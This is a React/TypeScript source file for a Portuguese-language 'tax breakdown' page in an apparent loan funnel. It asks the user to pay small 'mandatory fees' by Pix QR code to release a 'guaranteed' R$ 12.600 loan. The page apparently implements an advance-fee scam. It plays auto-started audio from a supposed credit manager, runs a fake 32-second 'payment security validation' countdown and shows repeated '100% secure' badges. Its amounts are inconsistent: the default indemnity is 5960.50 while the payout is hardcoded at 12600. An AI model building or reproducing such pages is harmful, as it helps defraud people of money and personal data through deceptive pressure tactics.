import { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { saveFunnelData, getFunnelData } from '../utils/funnelStorage';
import { FileText, CheckCircle, Shield, Play, Pause, Volume2 } from 'lucide-react';
import Header from '../components/Header';
import Footer from '../components/Footer';
import UserMenu from '../components/UserMenu';
import { navigateWithParams } from '../utils/urlParams';

export default function TaxBreakdownPage() {
  const navigate = useNavigate();
  const location = useLocation();
  const funnelData = getFunnelData();
  const { userData: stateUserData, indemnityAmount = 5960.50, pixKeyType, pixKey, urlParams } = location.state || {};
  const userData = stateUserData || funnelData.userData;
  const [isMenuOpen, setIsMenuOpen] = useState(false);
  const [isButtonEnabled, setIsButtonEnabled] = useState(false);
  const [countdown, setCountdown] = useState(32);
  const [isPlaying, setIsPlaying] = useState(false);
  const [currentTime, setCurrentTime] = useState(0);
  const [duration, setDuration] = useState(0);
  const audioRef = useRef<HTMLAudioElement>(null);
  const buttonRef = useRef<HTMLDivElement>(null);

  if (!userData || !pixKeyType || !pixKey) {
    navigate('/');
    return null;
  }

  const firstName = userData.nome.split(' ')[0];
  const iof = 9.27;
  const processingFee = 48.20;
  const totalTaxes = iof + processingFee;
  const netAmount = 12600.00;
  const taxPercentage = (totalTaxes / indemnityAmount) * 100;

  const formatCurrency = (value: number) => {
    return value.toLocaleString('pt-BR', {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    });
  };

  const handleMenuClick = () => {
    setIsMenuOpen(!isMenuOpen);
  };

  const handleMenuClose = () => {
    setIsMenuOpen(false);
  };

  useEffect(() => {
    const audioTimer = setTimeout(() => {
      if (audioRef.current) {
        audioRef.current.volume = 0.3;
        audioRef.current.play().catch((error) => {
          console.log('Autoplay prevented:', error);
        });
        setIsPlaying(true);
      }
    }, 2000);

    return () => {
      clearTimeout(audioTimer);
    };
  }, []);

  useEffect(() => {
    if (countdown > 0) {
      const timer = setTimeout(() => {
        setCountdown(countdown - 1);
      }, 1000);
      return () => clearTimeout(timer);
    } else {
      setIsButtonEnabled(true);
    }
  }, [countdown]);

  useEffect(() => {
    if (isButtonEnabled && buttonRef.current) {
      setTimeout(() => {
        buttonRef.current?.scrollIntoView({ behavior: 'smooth', block: 'center' });
      }, 300);
    }
  }, [isButtonEnabled]);

  useEffect(() => {
    const audio = audioRef.current;
    if (!audio) return;

    const updateTime = () => setCurrentTime(audio.currentTime);
    const updateDuration = () => setDuration(audio.duration);
    const handleEnded = () => setIsPlaying(false);

    audio.addEventListener('timeupdate', updateTime);
    audio.addEventListener('loadedmetadata', updateDuration);
    audio.addEventListener('ended', handleEnded);

    return () => {
      audio.removeEventListener('timeupdate', updateTime);
      audio.removeEventListener('loadedmetadata', updateDuration);
      audio.removeEventListener('ended', handleEnded);
    };
  }, []);

  const togglePlayPause = () => {
    if (audioRef.current) {
      if (isPlaying) {
        audioRef.current.pause();
      } else {
        audioRef.current.play();
      }
      setIsPlaying(!isPlaying);
    }
  };

  const formatTime = (time: number) => {
    if (isNaN(time)) return '0:00';
    const minutes = Math.floor(time / 60);
    const seconds = Math.floor(time % 60);
    return `${minutes}:${seconds.toString().padStart(2, '0')}`;
  };

  const handleContinue = () => {
    navigateWithParams(
      navigate,
      '/pagamento-qrcode',
      location,
      {
        userData,
        indemnityAmount,
        pixKeyType,
        pixKey
      }
    );
  };

  return (
    <div className="min-h-screen bg-[#f4f4f4] flex flex-col">
      <Header showUserIcon={true} onMenuClick={handleMenuClick} />
      <UserMenu isOpen={isMenuOpen} onClose={handleMenuClose} userName={firstName} />

      <main className="flex-1 flex items-center justify-center p-4 sm:p-6 md:p-8 pt-24 sm:pt-28 pb-20">
        <div className="w-full max-w-sm sm:max-w-md lg:max-w-2xl">
          <div className="text-center mb-5 sm:mb-6 animate-fade-in-down">
            <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 mb-2">
              Finalização do Processo
            </h1>
            <p className="text-sm sm:text-base text-gray-600 mb-1">
              <span className="font-semibold">{firstName}</span>, finalize o processo para receber seu
            </p>
            <p className="text-sm sm:text-base text-gray-600 mb-3">empréstimo</p>
            <p className="text-xs sm:text-sm text-gray-500">
              CPF: {userData.cpf}
            </p>

            <div className="bg-gradient-to-br from-purple-50 to-white border border-purple-200 rounded-xl p-4 mt-4 mx-auto max-w-md shadow-sm animate-slide-up">
              <div className="flex items-center gap-3 mb-3">
                <div className="w-12 h-12 flex-shrink-0">
                  <div className="w-12 h-12 rounded-full overflow-hidden border-2 border-white shadow-md">
                    <img
                      src="/Screenshot_186.png"
                      alt="Rafaela"
                      className="w-full h-full object-cover"
                    />
                  </div>
                </div>
                <div className="text-left flex-1">
                  <h3 className="text-base font-bold text-gray-900">
                    Rafaela
                  </h3>
                  <p className="text-xs text-purple-700">
                    Gerente de Crédito
                  </p>
                </div>
              </div>

              <div className="bg-white rounded-lg p-3 shadow-sm">
                <div className="flex items-center gap-2">
                  <button
                    onClick={togglePlayPause}
                    className="w-9 h-9 bg-purple-600 hover:bg-purple-700 text-white rounded-full flex items-center justify-center transition-colors flex-shrink-0"
                  >
                    {isPlaying ? (
                      <Pause className="w-4 h-4" />
                    ) : (
                      <Play className="w-4 h-4 ml-0.5" />
                    )}
                  </button>

                  <div className="flex-1">
                    <div className="relative w-full h-1.5 bg-gray-200 rounded-full overflow-hidden mb-0.5">
                      <div
                        className="absolute h-full bg-purple-600 rounded-full transition-all duration-100"
                        style={{ width: `${duration ? (currentTime / duration) * 100 : 0}%` }}
                      >
                        <div className="absolute right-0 top-1/2 -translate-y-1/2 w-3 h-3 bg-purple-600 rounded-full shadow-md"></div>
                      </div>
                    </div>
                    <div className="flex justify-between text-xs text-gray-500 mt-0.5">
                      <span>{formatTime(currentTime)}</span>
                      <span>{formatTime(duration)}</span>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <audio
              ref={audioRef}
              src="https://audio.jukehost.co.uk/I29mBaNwha9tQ3H88bIoUbIydPLTwZwL"
              preload="auto"
            />
          </div>

          <div className="text-center mb-5 sm:mb-6 mt-8">
            <h2 className="text-xl sm:text-2xl font-semibold text-gray-900 mb-2">
              Detalhamento das Taxas
            </h2>
          </div>

          <div className="space-y-3 sm:space-y-4 mb-5 sm:mb-6">
            <div className="bg-gradient-to-r from-purple-600 to-purple-700 rounded-lg p-4 sm:p-5 text-white shadow-md animate-slide-up">
              <div className="flex items-center gap-2 sm:gap-3">
                <div className="w-10 h-10 sm:w-11 sm:h-11 bg-white/20 rounded-lg sm:rounded-xl flex items-center justify-center flex-shrink-0">
                  <FileText className="w-5 h-5 sm:w-6 sm:h-6 text-white" />
                </div>
                <div>
                  <h2 className="font-semibold text-base sm:text-lg">Taxas Obrigatórias</h2>
                  <p className="text-xs sm:text-sm text-purple-50">IOF + Taxa de Processamento</p>
                </div>
              </div>
            </div>

            <div className="grid grid-cols-1 gap-3 animate-slide-up-delayed">
              <div className="bg-white border border-gray-200 rounded-lg p-4 shadow-sm">
                <div className="flex items-start justify-between gap-3 mb-2">
                  <h3 className="text-gray-900 font-semibold text-sm sm:text-base flex-1">
                    IOF - Imposto sobre Operações Financeiras
                  </h3>
                  <p className="text-purple-600 font-bold text-xl sm:text-2xl whitespace-nowrap">
                    R$ 9,27
                  </p>
                </div>
                <p className="text-gray-500 text-xs">
                  Imposto federal obrigatório por lei. Alíquota: 0,5%.
                </p>
              </div>

              <div className="bg-white border border-gray-200 rounded-lg p-4 shadow-sm">
                <div className="flex items-start justify-between gap-3 mb-2">
                  <h3 className="text-gray-900 font-semibold text-sm sm:text-base flex-1">
                    Seguro Prestamista
                  </h3>
                  <p className="text-purple-600 font-bold text-xl sm:text-2xl whitespace-nowrap">
                    R$ 48,20
                  </p>
                </div>
                <p className="text-gray-500 text-xs">
                  Consulta institucional e transferência PIX.
                </p>
              </div>
            </div>
          </div>

          <div className="space-y-3 sm:space-y-4 mb-5 sm:mb-6 animate-slide-up-summary">
            <div className="bg-white border border-gray-200 rounded-lg p-3 sm:p-4 shadow-sm">
              <p className="text-gray-600 text-xs mb-1">
                Total das taxas obrigatórias
              </p>
              <p className="text-gray-900 font-semibold text-lg sm:text-xl">
                R$ {formatCurrency(totalTaxes)}
              </p>
              <p className="text-gray-500 text-xs mt-1">
                Apenas {taxPercentage.toFixed(1)}% do valor total a receber
              </p>
            </div>

            <div className="bg-gradient-to-br from-purple-600 to-purple-700 rounded-lg p-5 sm:p-6 text-white shadow-md">
              <p className="text-purple-50 text-sm sm:text-base font-semibold mb-2">
                Você receberá
              </p>
              <p className="text-white font-bold text-4xl sm:text-5xl">
                R$ {formatCurrency(netAmount)}
              </p>
              <p className="text-purple-100 text-sm sm:text-base mt-2">
                Valor líquido garantido
              </p>
            </div>
          </div>


          {!isButtonEnabled && (
            <div className="mb-5 animate-slide-up-button">
              <div className="bg-gradient-to-br from-purple-50 to-white border-2 border-purple-300 rounded-xl p-5 shadow-sm">
                <div className="flex items-center gap-3 mb-3">
                  <CheckCircle className="w-6 h-6 text-blue-600" />
                  <span className="text-blue-900 font-semibold text-sm sm:text-base">
                    Validando segurança do pagamento...
                  </span>
                </div>
                <div className="bg-white rounded-full h-3 overflow-hidden mb-3">
                  <div
                    className="h-full bg-gradient-to-r from-purple-500 to-purple-600 transition-all duration-1000 ease-linear"
                    style={{ width: `${((32 - countdown) / 32) * 100}%` }}
                  ></div>
                </div>
                <div className="flex items-center justify-center gap-2 text-gray-600">
                  <div className="w-4 h-4 border-2 border-purple-600 border-t-transparent rounded-full animate-spin"></div>
                  <span className="text-sm">Aguarde {countdown}s</span>
                </div>
              </div>

              <div className="mt-4 bg-gradient-to-br from-green-50 to-emerald-50 border-2 border-green-400 rounded-xl p-5 shadow-sm">
                <div className="flex items-center gap-2 mb-3">
                  <Shield className="w-6 h-6 text-green-600" />
                  <h3 className="text-green-900 font-bold text-base">Pagamento 100% Seguro</h3>
                </div>
                <div className="space-y-2">
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-600" />
                    <span className="text-green-800 text-sm">Ambiente protegido por SSL</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-600" />
                    <span className="text-green-800 text-sm">Dados criptografados</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-600" />
                    <span className="text-green-800 text-sm">Processamento instantâneo</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-600" />
                    <span className="text-green-800 text-sm">Suporte 24h disponível</span>
                  </div>
                </div>
              </div>
            </div>
          )}

          {isButtonEnabled && (
            <div ref={buttonRef}>
              <button
                onClick={handleContinue}
                className="w-full py-4 sm:py-5 px-6 rounded-lg font-semibold text-base sm:text-lg transition-all duration-200 shadow-md hover:shadow-lg uppercase bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white cursor-pointer leading-tight animate-pulse-button"
              >
                <div>Fazer Pagamento</div>
                <div>E Receber Empréstimo</div>
              </button>

              <div className="mt-5 bg-gradient-to-br from-green-50 to-emerald-50 border-2 border-green-400 rounded-xl p-5 shadow-sm animate-slide-up-security">
                <div className="flex items-center gap-2 mb-3">
                  <Shield className="w-6 h-6 text-green-600" />
                  <h3 className="text-green-900 font-bold text-base">Pagamento 100% Seguro</h3>
                </div>
                <div className="space-y-2">
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-600" />
                    <span className="text-green-800 text-sm">Ambiente protegido por SSL</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-600" />
                    <span className="text-green-800 text-sm">Dados criptografados</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-600" />
                    <span className="text-green-800 text-sm">Processamento instantâneo</span>
                  </div>
                  <div className="flex items-center gap-2">
                    <CheckCircle className="w-4 h-4 text-green-600" />
                    <span className="text-green-800 text-sm">Suporte 24h disponível</span>
                  </div>
                </div>
              </div>
            </div>
          )}

        </div>
      </main>

      <Footer />

      <style>{`
        @keyframes fade-in-down {
          from {
            opacity: 0;
            transform: translateY(-20px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-fade-in-down {
          animation: fade-in-down 0.5s ease-out;
        }

        @keyframes slide-up {
          from {
            opacity: 0;
            transform: translateY(30px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }
        .animate-slide-up {
          animation: slide-up 0.6s ease-out 0.2s backwards;
        }

        .animate-slide-up-delayed {
          animation: slide-up 0.6s ease-out 0.4s backwards;
        }

        .animate-slide-up-summary {
          animation: slide-up 0.6s ease-out 0.6s backwards;
        }

        .animate-slide-up-button {
          animation: slide-up 0.6s ease-out 0.8s backwards;
        }

        .animate-slide-up-security {
          animation: slide-up 0.6s ease-out 1s backwards;
        }

        @keyframes pulse-button {
          0%, 100% {
            transform: scale(1);
            box-shadow: 0 10px 15px -3px rgba(34, 197, 94, 0.3), 0 4px 6px -2px rgba(34, 197, 94, 0.2);
          }
          50% {
            transform: scale(1.08);
            box-shadow: 0 25px 50px -12px rgba(34, 197, 94, 0.5), 0 10px 20px -5px rgba(34, 197, 94, 0.4);
          }
        }
        .animate-pulse-button {
          animation: pulse-button 1.5s cubic-bezier(0.4, 0, 0.6, 1) infinite;
        }
      `}</style>
    </div>
  );
}
